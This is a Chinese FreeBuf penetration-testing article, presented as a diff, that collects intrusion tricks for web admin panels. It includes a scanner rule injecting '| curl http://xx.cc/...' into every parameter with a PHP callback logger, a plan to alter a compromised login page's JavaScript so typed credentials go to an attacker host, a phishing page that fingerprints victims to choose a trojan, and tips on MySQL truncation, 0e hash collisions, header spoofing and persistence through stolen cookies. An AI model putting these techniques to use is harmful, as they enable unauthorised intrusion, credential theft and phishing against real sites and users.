@@ -1,0 +1,108 @@
+*本文原创作者：心东，本文属FreeBuf原创奖励计划，未经许可禁止转载
+场景：WEB后台爆破
+后台爆破很多人都会选择最经典的模式，如字典爆破，挖掘未授权访问漏洞，挖掘验证码漏洞（未刷新，验证码识别）等方法。
+猜想：
+1、后台程序是采用MD5加密的方式，并且验证密码跟被验证密码都是从PHP的MD5加密处理的 （PHP5~7存在此BUG），例如：
+原理：
+程序在处理哈希字符串时，会利用”不等于 或 等于 来对哈希值进行比较，它把每一个以 0E 开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以0E开头的，那么PHP就会认为他们相等。那么在爆破的时候 字典加入一个MD5加密之后以0e开头的明文密码即可。
+2、前台有注册，是否跟后台用的是同一个SESSION文件，例如：
+这个SESSION 我们可以假设。程序员在开发中 注册一个会员那么就会添加一条数据到数据库里。 登录验证成功后会写入一个session，那么后台验证中判断session他可能是这样写的。
+if($_SESSION['user']){ return True; }
+这个设计缺陷 可以假设 他的session跟前台用户的session用的是同一个。从而导致一个未授权访问。（前台登录之后访问后台） 当然也可以说成是越权。因为我们从一 个注册会员登录写入了session 从而导致有访问后台的权限 PS：具体情况得看代码怎么写。
+以上方法 我们可以幻想很多很多种漏洞。列如这个
+我们又可以这样猜想：system的键名是用来判断权限。1则为管理员 0则为普通用户 在前台有个注册功能，那么我们又联想到了一个MYSQL的一个溢出漏洞my.ini。
+sql-mode=”NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION”
+比如一个表的结构是这样的：
+create table admin( username varchar(10) not null, passwd varchar(10) not null);
+可以看到username跟passwd的字节为10，但是my.ini设置成
+sql-mode=”NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION”
+的话，就算超出也会添加成功，比如：
+insert into admin values(‘1234567891 2’,'123456');
+他不会插入“1234567891 2 ”而是插 ”1234567891“ 因为指针到1的时候字节就等于10了。因此我们注册会员的时候，admin、空格、空格、空格、空格、空格、XX，然后这样就会注册到了admin。
+切回话题，我们又可以很离谱的这样猜想。前台注册用户用的数据库跟后台是同一个数据表字段。那么我们可以从前台注册然后登录后台。（这种我还是碰到过的）
+当然思路还是有很多很多的，得看你去怎么去猜想他的代码了
+场景：WEB扫描器忽略的功能
+扫描器相信大家都是用过的，比如一些知名的扫描器：BURP、AppScan 等，但是扫描器也有不够人性化的时候，例如爬虫扫描。
+这样我们就以扫描为主题：
+1、表单破解，有验证码 2、扫描values型SQL注入 3、存储XSS误报多 4、被隐藏的某种存在高危漏洞的功能（列如 存在命令执行 没有任何响应的情况下 扫描器判断不出来）
+在这里公布一个自写AWVS的扫描规则库(扫描命令执行无响应)：
+规则库目录说明：（放到规定目录即可）
+文件名：cmd.script
+解释：扫描过程中 每个参数都会添加
+例如： | curl http://xx.cc/ 然后发送请求 i_url 变量是当前扫描的YRL
+var targetUrl = new TURL(scanURL.url); // 获取当前的方案 也就是获取爬虫到的当前请求 var scheme = getCurrentScheme(); // 创建一个HTTP的工作（要求） var http = new THTTPJob(); // 在新创建的作业中填充计划 将当前请求添加到HTTP scheme.populateRequest(http); http_top = http.request; //获取HTTP请求头 //http_top.msg2 获取文件+参数 hmsg2 = http_top.msg2.replace(/&/g, "-") i_url = scanURL.hostPort+"/"+hmsg2; // 一个方案可以有多个输入 for (var i=0;i<scheme.inputCount; i++) { // 每个输入可以有多个变化 var variations = scheme.selectVariationsForInput(i); for (var j=0; j < variations.count; j++) { // 负荷的变化 scheme.loadVariation(variations.item(j)); // 设置我们的有效载荷的输入值 <XSS> scheme.setInputValue(i, unescape('curl http://xx.cc/xd.php?i='+i_url)); // 创建一个HTTP的工作（要求） var job = new THTTPJob(); // 设置工作targeturl URL job.url = targetUrl; // 在新创建的作业中填充计划 scheme.populateRequest(job); // 执行HTTP工作 job.execute(); } } // 一个方案可以有多个输入 for (var i=0;i<scheme.inputCount; i++) { // 每个输入可以有多个变化 var variations = scheme.selectVariationsForInput(i); for (var j=0; j < variations.count; j++) { // 负荷的变化 scheme.loadVariation(variations.item(j)); // 设置我们的有效载荷的输入值 <XSS> scheme.setInputValue(i, unescape('| curl http://xx.cc/xd.php?i='+i_url)); // 创建一个HTTP的工作（要求） var job = new THTTPJob(); // 设置工作targeturl URL job.url = targetUrl; // 在新创建的作业中填充计划 scheme.populateRequest(job); // 执行HTTP工作 job.execute(); } } // 一个方案可以有多个输入 for (var i=0;i<scheme.inputCount; i++) { // 每个输入可以有多个变化 var variations = scheme.selectVariationsForInput(i); for (var j=0; j < variations.count; j++) { // 负荷的变化 scheme.loadVariation(variations.item(j)); // 设置我们的有效载荷的输入值 <XSS> scheme.setInputValue(i, unescape('| curl http://xx.cc/xd.php?i='+i_url+"%23")); // 创建一个HTTP的工作（要求） var job = new THTTPJob(); // 设置工作targeturl URL job.url = targetUrl; // 在新创建的作业中填充计划 scheme.populateRequest(job); // 执行HTTP工作 job.execute(); } } // 一个方案可以有多个输入 for (var i=0;i<scheme.inputCount; i++) { // 每个输入可以有多个变化 var variations = scheme.selectVariationsForInput(i); for (var j=0; j < variations.count; j++) { // 负荷的变化 scheme.loadVariation(variations.item(j)); // 设置我们的有效载荷的输入值 <XSS> scheme.setInputValue(i, unescape(' | curl http://xx.cc/xd.php?i='+i_url+")%23")); // 创建一个HTTP的工作（要求） var job = new THTTPJob(); // 设置工作targeturl URL job.url = targetUrl; // 在新创建的作业中填充计划 scheme.populateRequest(job); // 执行HTTP工作 job.execute(); } } // 一个方案可以有多个输入 for (var i=0;i<scheme.inputCount; i++) { // 每个输入可以有多个变化 var variations = scheme.selectVariationsForInput(i); for (var j=0; j < variations.count; j++) { // 负荷的变化 scheme.loadVariation(variations.item(j)); // 设置我们的有效载荷的输入值 <XSS> scheme.setInputValue(i, unescape(' | curl http://xx.cc/xd.php?i='+i_url+"))%23")); // 创建一个HTTP的工作（要求） var job = new THTTPJob(); // 设置工作targeturl URL job.url = targetUrl; // 在新创建的作业中填充计划 scheme.populateRequest(job); // 执行HTTP工作 job.execute(); } } 接受请求的PHP代码： 文件名：xd.php <?php $ip = $_SERVER["REMOTE_ADDR"]? $_SERVER["REMOTE_ADDR"] : ""; if($ip){ $i = empty($_GET['i'])? "" : $_GET['i']; $txt = htmlspecialchars($ip."-----".$i."\r
+"); $na = fopen("xd.txt", "a+"); $xie = fwrite($na, $txt); } ?> 文件名： cmd_inspect.script 解释：扫描器扫完后 发送一个HTTP请求 判断是否这个域名是否存在命令执行漏洞 // scanurl.url返回URL字符串 var targetUrl = new TURL("http://xx.cc/xd.txt"); var http = new THTTPJob(); http.url = targetUrl; http.verb = 'GET'; // 执行请求 http.execute(); var dzRes = http.response.body; //获取HTTP响应内容 if(dzRes.indexOf(scanURL.hostPort) != -1){ logInfo('message:----> yuanchengminglingzhixing!!');//扫描日志输出信息 var ri = new TReportItem();//新建报告结果 返回扫描器界面 ri.LoadFromFile("cmd.xml"); //载入模板 ri.affects = "http://xx.cc/xd.txt"; ri.request = http.request.toString(); //将HTTP请求头输出到扫描器 ri.response = http.response.body; //将HTTP响应的内容输出到扫描器 ri.fullResponse = http.response.body; //将HTTP响应的内容输出到扫描器 // 添加警报 AddReportItem(ri);//确定输出 }
+回归话题，我们猜想到许许多多扫描器忽视的功能
+例如：爬虫爬不到的地方，values型SQL注入，存在XSS，当然不是高危漏洞我们就不必挖掘，因为我们目的是以入侵为主，像某些逻辑漏洞我们可以无视。
+场景：拿到webshell 数据密码加密的情况下获得明文密码
+我们拿到webshell之后想拿到数据库的明文密码，我们一开始的思维肯定在想：逆推，撞库，还有就是嗅探 等方法。
+嗅探方法：流量大，易被防火墙报警。
+逆推方法：耗脑。
+撞库方法：走很多个步骤。（收集数据）
+其实我们可以换个角度去想的，居然我们都拿到webshell了，还不如修改 WEB程序，例如验证用户密码是否对错，如果登录成功，那么就记录他的。
+例如这个。
+那么问题来了，没权限修改怎么办？你可能会想到提权。。。
+其实我们把目光指向到HTML。。。列如
+我们可以看到有后台登录页面有包含JS的地方，那么我们可以去修改JS，利用ajax方法来获取html 的input的值来发送到我们服务器上，但是也可以不用ajax方法。
+你也可以用这种方法。
+比如：比如点击提交按钮被触发后 我们可以获取input的值 然后 <img src="http://xx.cc/1.php?user=xxx&pass=xxx" />
+当然如果JS文件还没权限修改的话 你可以提权。。又或者你有跟他同一个局域网的机器，进行中间人劫持。如果他是HTTPS的话 你可以往里面注入个JS。
+场景：收集信息无从下手
+收集信息我个人觉得这个要个人的实战经验，以及思考能力。我个人的实战经验虽不算多，不过在这里我还是说下某些信息被我们忽视掉的信息。
+第一种：
+列如某站：www.aa.com (未做CDN)
+很多人都会走以下流程:收集子域，注册人信息以及注册过的域名 关联域名 等等。
+同时也有人忽视掉了一点，那就是域名解析历史IP，我们可以这样猜想 域名没换，但是服务器搬了很多次。
+当前某域名解析的IP是69.。那么我们可以大胆的假设，103开头的IP是以前的服务器，域名现在解析换成了69开头的，但是103开头的服务器网站服务还是开的，数据也没清理。。。我们把网站解析到103开头的IP，这也是一种收集信息的技巧。。。
+第二种：
+查找跟目标同一个内网 关联的域名，（C段 根据网站内容判断是否跟目标同一个内网，子域，或者有着关联的部门，又或者有着直接关联的，再或者从百科了解信息查找可疑跟目标同一个内网的站。。还有很多种方法）
+场景：渗透攻击之钓鱼
+相信鱼叉攻击法大家都是用过的，如果只是针对一个单用户钓鱼的话 我们可以利用某种辅助功能来收集信息为我们入侵铺上更好的环境。
+比如：一个MVC思想的站中。收集信息（找目标源码 什么都没有 包括邮箱信息），以及 任何 任何 任何的入侵方式都无效并且我们感到无能为力的情况下。 但是有个提交留言板（毫无漏洞）。
+我们可以这样想。插入一个URL，比如：http://www.a.com/1.php
+1、php 代码如下：
+<?php header("Content-type: text/html; charset=gb2312"); include './1.html'; $http = $_SERVER['HTTP_USER_AGENT']? $_SERVER['HTTP_USER_AGENT'] : ""; $ip = $_SERVER["REMOTE_ADDR"]? $_SERVER["REMOTE_ADDR"] : ""; $txt = htmlspecialchars($ip."-----".$http."\r
+"); $na = fopen("xd2.txt", "a+"); $xie = fwrite($na, $txt); ?>
+2、HTML 是钓鱼内容
+代码中记录到了浏览器头，我们从浏览器头可以判断目标是用了windows系统还是linux系统，列如MAC 系统 我们可以准备MAC 木马。。
+我们又记录到了他的IP。我们又可以去想象 记录中的 IP是可以代理IP，公网，我们可以从他的代理IP下手，又或者C段 进行中间人攻击。。。
+场景：找后台（重定向攻击法）
+相信大家都有碰到过这种情况。找目标管理后台，找邮件登录的WEB域名等。。。
+一开始大家的思路都是：扫描全网。靠搜索引擎 等其他非常经典的方法。
+但是在某种条件下我们可以利用WEB语言或浏览器脚本语言进行辅助型攻击。
+比如网站前台有提交信息给后台，我们可以利用存储XSS进行攻击从而获取到后台地址 这也是一种方法。
+但是问题来了 提交了之后后台没有触发到JS怎么办？
+我们可以把思路放到A标签。A标签就是重点。列如这种 我们想查找他的邮件的登录域名。
+记录到的HTTP_REFERER 写入文件即可。
+点击之后。
+此方法也并不是百分百成功，在某种条件下才能利用。
+第二种方法：
+我们可以猜想目标站就只是个负责输出数据给用户看而已，而真真正正的后台是另外一个域名管理目标站，并且需要绑定HOST文件才可以。
+自写小工具：https://github.com/xindongzhuaizhuai/host_ip/
+我们的思路可以这样想：扫全网（不建议），查找可疑IP（C段 历史IPC段 注册过的域名C段 等方法）
+场景：查找真实IP
+这个找真实IP似乎是每个安全工程师都会经历过的事情 无非就是 扫文件 找历史IP 邮寄发送 DDOS 扫全网。等方法
+其他方法都还可以 但是我个人觉得扫全网 似乎就是开着坦克打飞机。至于为什么这样说 我得解释一下：
+我们就拿zmap来说吧 扫描速度很好 非常强大，但是往往越强大的工具就越有缺点。
+原因：zmap 流量识别太简单，他速度快的原因是因为tcp会话要3次握手才能建立，而zmap直接第一次握手就把请求断掉了。于是大多数VPS一扫就封。。。
+回归话题 其实找真实IP 不妨我们试试挖掘SSRF XEE这类的漏洞 文件包含等（只要能控制目标能发送请求即可）
+PS：如果挖到这种漏洞的 你可以尝试利用expect等方式执行命令getshell了。
+场景：被忽略掉的隐藏功能
+不知道大家有没有碰到过这种功能 后台登录有记录非法操作 例如 登录后台错误5次 就被记录到数据库 然后管理界面UI输出说 此IP 登录用户名ADMIN 错误。。
+我们可以这样猜想：获取IP 有漏洞 可以伪造。
+我们在渗透中 有几种请求务必要修改的。那就是浏览器头
+以及 ：
+X-FORWARDED-FOR Proxy-Client-IP WL-Proxy-Client-IP HTTP_CLIENT_IP X-Forwarded-For
+这里公布一个火狐浏览器（中国版）存在IP伪造漏洞。
+你可以往这里插入XSS，当然你也可以修改其他IP来绕过后台（有些后台登录需要IP白名单验证）
+场景：后台拿不了shell却又想留后门
+有很多白帽子都有挖过未授权访问。我看过很多的中国黑客入侵文章 从未发现过文章中有 未授权操作这一类的入侵网站。
+我记得14年在广州培训PHP的时候。老师要求 每个小组 写一个网站程序出来，答辩结束后，源码就会被共享出来，我从20套源码（MVC思想）开始代码审计的时候 发现超过10套源码都有未授权操作这个漏洞。
+也在工作实战中也碰到很多这种漏洞。。不知道是程序员太新手，还是太大意，漏洞是这样的：访问后台功能的时候做了限制（未授权不能访问），但是在其他类上却没做任何限制 列如 添加数据。
+我们跳回话题：
+在WEB管理后台拿webshell的时候 再无能为力的情况下，但是你又想长时间进入后台。
+方法：1、有些站COOKIE也有永不过期的，你可以记录他的COOKIE利用它来进行登录。
+方法：2、挖掘未授权操作。列如 尝试 添加管理员 抓包 记录 URL 以及参数 等。。。在未登录的情况下进行添加。
+总结：渗透的思路中，不仅仅靠技术 靠经验 最重要的是脑子去往其他地方思考、以上我写的我只是打个比喻。其实在很多场景中得自己学会去随机应变。
+流程：分析—>猜想—>实验—>结果（运气好 技术有创新）
+*本文原创作者：心东，本文属FreeBuf原创奖励计划，未经许可禁止转载
